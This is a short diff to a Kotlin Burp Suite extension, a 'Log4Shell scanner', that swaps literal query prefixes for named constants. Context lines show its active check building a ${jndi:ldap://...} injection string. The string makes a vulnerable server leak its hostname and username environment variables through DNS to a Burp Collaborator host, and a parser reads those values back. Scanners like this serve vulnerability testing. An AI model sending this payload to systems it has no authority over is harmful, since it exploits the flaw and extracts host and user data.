@@ -23,6 +23,8 @@ import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 
 const val NAME = "Log4Shell scanner"
+const val QUERY_HOSTNAME = 'h'
+const val QUERY_HOSTUSER = 'u'
 
 class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
 
@@ -65,7 +67,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
     override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
         val context = mutableListOf<Pair<IHttpRequestResponse, IntArray>>()
         val collabResults = mutableListOf<IBurpCollaboratorInteraction>()
-        for ((prefix, key) in listOf(Pair("h", "hostName"), Pair("u", "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
+        for ((prefix, key) in listOf(Pair(QUERY_HOSTNAME, "hostName"), Pair(QUERY_HOSTUSER, "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
             val payload = collaborator.generatePayload(false)
             val bytes = "\${jndi:ldap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
             val request = insertionPoint!!.buildRequest(bytes)
@@ -169,9 +171,9 @@ private fun extractHostUser(query: ByteArray): Pair<String, String?>? {
     val len = query[12].toInt()
     if (len and 0xc0 != 0) return null
     val decoded = query.decodeToString(startIndex = 13, endIndex = 13 + len)
-    if (decoded.startsWith('h')) {
+    if (decoded.startsWith(QUERY_HOSTNAME)) {
         return Pair(decoded.substring(1), null)
-    } else if (decoded.startsWith('u')) {
+    } else if (decoded.startsWith(QUERY_HOSTUSER)) {
         val parts = decoded.substring(1).split("-s2u-")
         if (parts.size != 2) return null
         return Pair(parts[0], parts[1])
